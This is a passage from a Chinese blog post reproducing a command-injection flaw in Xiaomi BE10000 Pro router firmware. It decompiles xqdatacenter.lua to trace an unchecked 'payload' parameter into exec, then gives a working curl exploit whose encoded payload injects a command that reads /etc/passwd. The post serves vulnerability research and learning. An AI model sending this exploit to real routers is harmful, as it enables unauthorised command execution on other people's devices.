+<p>然后进行编译，发现有69条指令，6个寄存器，23个常数，13个功能</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/luac -l -l /usr/lib/lua/luci/controller/api/xqdatacenter.lua &gt; xqda</span><br><span class="line">tacenter_bytecode.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787468928786.png">
+
+<p>然后跟进这个函数</p>
+<img src="/image/1787469270830.png">
+
+<p>查找函数位置</p>
+<img src="/image/1787470476798.png">
+
+<img src="/image/1787470993935.png">
+
+<p>然后查看这个地址的相关内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -n <span class="string">&#x27;0xffffa5270130&#x27;</span> xqdatacenter_bytecode.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787475727245.png">
+
+<p>然后查看508行内容，但是我的发现位置是在467行，没搞懂为什么</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n <span class="string">&#x27;467,508p&#x27;</span> ./xqdatacenter_bytecode.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787475795839.png">
+
+<p>把这些指令翻译成 Lua 代码，就是：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> binaryBase64Enc = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.util.XQCryptoUtil&quot;</span>).binaryBase64Enc</span><br><span class="line"><span class="keyword">local</span> formvalue_unsafe = http.formvalue_unsafe</span><br><span class="line"><span class="keyword">local</span> payload = formvalue_unsafe(<span class="string">&quot;payload&quot;</span>)          <span class="comment">-- 不安全的获取</span></span><br><span class="line"><span class="keyword">local</span> encoded = binaryBase64Enc(payload)             <span class="comment">-- Base64编码</span></span><br><span class="line"><span class="keyword">local</span> template = <span class="string">&quot;THRIFT_TUNNEL_TO_DATACENTER&quot;</span>       <span class="comment">-- 实际值 &quot;thrifttunnel 0 &#x27;%s&#x27;&quot;</span></span><br><span class="line"><span class="keyword">local</span> cmd = <span class="built_in">string</span>.<span class="built_in">format</span>(template, encoded)         <span class="comment">-- 组装命令</span></span><br><span class="line">exec(cmd)                                            <span class="comment">-- 执行！</span></span><br></pre></td></tr></table></figure>
+
+<p>所以漏洞的完整执行路径是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">您的 payload 参数 (恶意命令)</span><br><span class="line">    ↓</span><br><span class="line">formvalue_unsafe(<span class="string">&quot;payload&quot;</span>)     ← 第<span class="number">9</span>-<span class="number">11</span>行：不检查，直接获取</span><br><span class="line">    ↓</span><br><span class="line">binaryBase64Enc(payload)        ← 第<span class="number">12</span>行：Base64编码</span><br><span class="line">    ↓</span><br><span class="line">string.<span class="built_in">format</span>(template, encoded) ← 第<span class="number">14</span>行：组装成 <span class="string">&quot;thrifttunnel 0 &#x27;Base64内容&#x27;&quot;</span></span><br><span class="line">    ↓</span><br><span class="line"><span class="built_in">exec</span>(cmd)                       ← 第<span class="number">18</span>行：执行命令</span><br><span class="line">    ↓</span><br><span class="line">thrifttunnel 解码并转发给 datacenter</span><br><span class="line">    ↓</span><br><span class="line">datacenter 执行命令注入</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://192.168.10.2:8080/cgi-bin/luci/;stok=fefa36119e3f66ada1d1b74c669276d3/api/xqdatacenter/request&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Host: 192.168.10.2:8080&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Cookie: psp=admin&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;payload=%7b%22%61%70%69%22%3a%37%2c%22%64%65%76%22%3a%22%61%22%2c%22%76%65%6e%64%6f%72%22%3a%22%76%75%6c%6e%3b%28%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%3e%20%2f%74%6d%70%2f%70%77%6e%2e%74%78%74%29%26%20%23%22%2c%22%74%79%70%65%22%3a%22%61%22%7d&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload实际内容</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;api&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span><span class="attr">&quot;vendor&quot;</span><span class="punctuation">:</span><span class="string">&quot;vuln;(cat /etc/passwd &gt; /tmp/pwn.txt)&amp; #&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787459117382.png">
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/552#xqdatacenterlua%E5%88%86%E6%9E%90">XiaomiBE10000 Pro固件模拟及漏洞复现 - IOTsec-Zone</a> </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://hfddh666.github.io">hfddh666</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hfddh666.github.io/2026/08/22/XiaomiBE10000-Pro%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://hfddh666.github.io/2026/08/22/XiaomiBE10000-Pro%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://hfddh666.github.io" target="_blank">hfddh666's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Iot/">Iot</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/08/19/WAVLINK-NU516-V251208&amp;V240425%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="WAVLINK-NU516-V251208&amp;V240425漏洞分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">WAVLINK-NU516-V251208&V240425漏洞分析</div></div><div class="info-2"><div class="info-item-1">WAVLINK-NU516-V251208&amp;V240425漏洞分析固件模拟固件下载地址：  https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&amp;model=all  然后binwalk后，查看busybox，架构是mips小端序32位，然后下在对应镜像 qemu启动 12345678sudo qemu-system-mipsel \        -M malta \        -cpu 74Kf \        -kernel ./vmlinux-3.2.0-4-4kc-malta \        -hda ./debian_squeeze_mipsel_standard.qcow2 \        -append &quot;root=/dev/sda1 console=ttyS0&quot; \        -net nic -net tap,ifname=tap0,script=no,downscript=no \        -nographic  查找服务类型 1f...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/04/19/CVE-2025-25343%E5%A4%8D%E7%8E%B0/" title="CVE-2025-25343复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-19</div><div class="info-item-2">CVE-2025-25343复现</div></div><div class="info-2"><div class="info-item-1">CVE-2025-25343漏洞信息   CNVD-ID CNVD-2025-09690    公开日期 2025-05-13   危害级别 高 (AV:N&#x2F;AC:L&#x2F;Au:N&#x2F;C:C&#x2F;I:C&#x2F;A:C)   影响产品 Tenda AC6 15.03.05.16   CVE ID CVE-2025-25343   漏洞描述 Tenda AC6是中国腾达（Tenda）公司的一款无线路由器。  Tenda AC6存在缓冲区溢出漏洞，该漏洞源于formexeCommand函数未能正确验证输入数据的长度大小，攻击者可利用该漏洞在系统上执行任意代码或导致拒绝服务。   漏洞类型 通用型漏洞   参考链接 https://nvd.nist.gov/vuln/detail/CVE-2025-25343   漏洞解决方案 目前厂商已发布升级程序修复该安全问题，详情见厂商官网： https://www.tenda.com.cn/material/show/102681   厂商补丁 Tenda AC6缓冲区溢出漏洞的补丁   验证信息 (暂无验证信息...</div></div></div></a><a class="pagination-related" href="/2026/03/10/CVE-2023-20073%E5%A4%8D%E7%8E%B0/" title="CVE-2023-20073"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-10</div><div class="info-item-2">CVE-2023-20073</div></div><div class="info-2"><div class="info-item-1">CVE-2023-20073复现ubuntu18复现的 漏洞介绍Cisco RV340，RV340W，RV345和 RV345P 四款型号的路由器中最新固件均存在一个未授权任意文件上传漏洞 ，攻击者可以在未授权的情况下将文件上传到 /tmp/upload 目录中，然后利用 upload.cgi 程序中存在的漏洞，最终造成存储型 XSS 攻击。 固件提取到思科官网下载img文件然后binwalk提取 1https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29  12345678910111213141516yy@yy-virtual-machine:~/桌面/1% binwalk -Me RV34X-v1.0.03.29-2022-10-17-13-45-34-PM.imgScan Time:     2026-03-10 21:20:49Target File:   /home/yy/桌面/1/RV34X-v1.0.03.29-2022-10-17-13-45-34-PM...</div></div></div></a><a class="pagination-related" href="/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/" title="DLink路由器RCE漏洞 CVE-2019-17621"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-09</div><div class="info-item-2">DLink路由器RCE漏洞 CVE-2019-17621</div></div><div class="info-2"><div class="info-item-1">描述 D-Link DIR-859 Wi-Fi 路由器 1.05 和 1.06B01 Beta01 中的 UPnP 端点 URL &#x2F;gena.cgi 允许未经认证的远程攻击者以 root 身份执行系统命令，通过在连接本地网络时向 UPnP 服务发送专门设计的 HTTP SUBSCRIBE 请求。  通过ubuntu18版本复现 漏洞分析先手操作前面就不多说了，拿到zip文件解压一下然后binwalk -eM就拿到了文件 看一下保护，mips-32位架构 1234567891011 checksec cgibin[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 5)[*] &#x27;/home/yy/桌面/_DIR822A1_FW103WWb03.bin.extracted/squashfs-root/htdocs/cgibin&#x27;    Arch:       mips-32-big    RELRO:      No RELRO   ...</div></div></div></a><a class="pagination-related" href="/2025/10/07/DIR-815/" title="DIR-815"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-07</div><div class="info-item-2">DIR-815</div></div><div class="info-2"><div class="info-item-1">首先：123wget https://unzip 文件名binwalk -Me .bin  IDA：漏洞函数123456789101112131415161718192021222345行	v0是请求方式，发现是post方式if ( strcasecmp(v0, &quot;POST&quot;) )&#123;  v1 = &quot;unsupported HTTP request&quot;;  goto LABEL_7;&#125;50行	进入这个函数cgibin_parse_request(sub_409AC4, 0, 0x20000);50/22行	输入两个环境变量，getenv为查找变量的值 if ( getenv(&quot;CONTENT_TYPE&quot;) &amp;&amp; (v6 = getenv(&quot;CONTENT_LENGTH&quot;)) != 0 )  50/32	 v10 = getenv(&quot;REQUEST_URI&quot;);  回到hedwigcgi_main: 67行	进入这个函数 sess_get_uid(v4...</div></div></div></a><a class="pagination-related" href="/2025/10/05/IOT%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" title="IOT前置知识"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-05</div><div class="info-item-2">IOT前置知识</div></div><div class="info-2"><div class="info-item-1">基础溢出：常见的就是shellcode和Rop技术 HTTP协议：http是一种超文本传输协议，是web上进行任意数据交换的基础，也是一种客户端-服务器协议。 它由请求和响应组成，三部分：请求行，消息报头，请求正文。 请求行：1Method Request-URI HTTP-Version CRLF   消息报头：包含各个字段，通常以key: value格式表示： 12Content-Length: 348Content-Type: application/x-www-form-urlencoded  请求正文：HTTP请求正文是请求消息中可选的部分，通常用于在 POST、PUT 或其他需要传递数据的请求中，携带客户端向服务器发送的数据。它是位于请求头之后的实际数据内容。可由多种数据组成，如表单、二进制、JSON等，如 12345678910POST /api/v1/user HTTP/1.1  # 请求行Host: api.example.com       # 消息报头（开始）Content-Type: application/jsonContent-Length: 55  ...</div></div></div></a><a class="pagination-related" href="/2026/04/29/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="TP-Link SR20命令执行漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-29</div><div class="info-item-2">TP-Link SR20命令执行漏洞复现</div></div><div class="info-2"><div class="info-item-1">TP-Link SR20命令执行漏洞复现介绍TDDP协议是TP-link设备的调试协议，该协议的版本分为两种，version1&#x2F;2，version1版本无需身份验证和对数据包加密，而version2要，所以只需向SR20设备的UDP 1040端口发送特定数据就可以了 固件模拟问题从 Download for SR20 | TP-Link 官网上下载 SR20(US)_V1_180518 ，binwalk一下，然后寻找一下tddp文件，qemu用户态启动，发现卡住了，我们gdb-multiarch连接上发现程序是卡在了select函数，然后IDA静态分析一下看看           IDA查找原因我们发现程序是输出了一个tddp task start字符，然后查找一下，发现是调用在sub_936c函数上 123$ sudo chroot ./ ./qemu-arm-static ./usr/bin/tddp        [sudo] yy 的密码： [tddp_taskEntry():151] tddp task start      sub_936c&#96;：v7 ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">hfddh666</div><div class="author-info-description">欢迎访问 hfddh666 的博客！</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" href="/about/"><i class="fab fa-github"></i><span>关于我</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XiaomiBE10000-Pro%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%881-0-70%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">XiaomiBE10000 Pro固件模拟及漏洞复现（1.0.70）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">提取固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%89%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">固件模拟前分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.3.</span> <span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#datacenter"><span class="toc-number">1.4.1.</span> <span class="toc-text">datacenter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xqdatacenter-lua"><span class="toc-number">1.4.2.</span> <span class="toc-text">xqdatacenter.lua</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.4.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/22/XiaomiBE10000-Pro%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="XiaomiBE10000 Pro固件模拟及漏洞复现">XiaomiBE10000 Pro固件模拟及漏洞复现</a><time datetime="2026-08-22T06:04:25.000Z" title="发表于 2026-08-22 14:04:25">2026-08-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/19/WAVLINK-NU516-V251208&amp;V240425%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="WAVLINK-NU516-V251208&amp;V240425漏洞分析">WAVLINK-NU516-V251208&amp;V240425漏洞分析</a><time datetime="2026-08-19T05:43:44.000Z" title="发表于 2026-08-19 13:43:44">2026-08-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/16/%E5%9F%BA%E4%BA%8Etenda-ac15%E8%AE%BE%E5%A4%87%E7%9A%84afl-%E6%B5%8B%E8%AF%95/" title="基于tenda_ac15设备的自动化漏挖测试">基于tenda_ac15设备的自动化漏挖测试</a><time datetime="2026-08-16T15:53:13.000Z" title="发表于 2026-08-16 23:53:13">2026-08-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/Qiling-%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-QilingLab-%E8%AF%A6%E8%A7%A3%E5%88%B0-Qiling-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="Qiling 框架分析实战：从 QilingLab 详解到 Qiling 源码分析">Qiling 框架分析实战：从 QilingLab 详解到 Qiling 源码分析</a><time datetime="2026-05-30T07:06:50.000Z" title="发表于 2026-05-30 15:06:50">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/26/Vivotek-Remote-Stack-Overflow/" title="Vivotek Remote Stack Overflow">Vivotek Remote Stack Overflow</a><time datetime="2026-05-26T12:24:07.000Z" title="发表于 2026-05-26 20:24:07">2026-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By hfddh666</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+<script>
+  // 枫叶脚本（数量减少，更轻盈）
+  $(document).ready(function() {
+    var leafCount = 0;
+    var maxLeaf = 15;
+    var fallSpeed = 1.8;
+    
+    function createLeaf() {
+      if (leafCount >= maxLeaf) return;
+      var size = Math.random() * 15 + 10;
+      var colors = ['#e65100','#ff7043','#f57c00'];
+      var color = colors[Math.floor(Math.random() * colors.length)];
+      
+      var leaf = $('<div class="maple-leaf"></div>').css({
+        top: -size + 'px',
+        left: Math.random() * $(window).width() + 'px',
+        width: size + 'px',
+        height: size + 'px'
+      });
+      leaf[0].style.setProperty('--leaf-color', color);
+      leaf.find('::before').css('background', color);
+      
+      $('body').append(leaf);
+      leafCount++;
+      
+      leaf.animate({
+        top: $(window).height() + size + 'px',
+        left: "+=" + (Math.random() * 150 - 75) + "px",
+        rotate: Math.random() * 720 + 'deg'
+      }, fallSpeed * 20000, 
+      function() {
+        $(this).remove();
+        leafCount--;
+      });
+    }
+    for (var i = 0; i < 8; i++) createLeaf();
+    setInterval(createLeaf, 800);
+  });
+</script>
+<script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
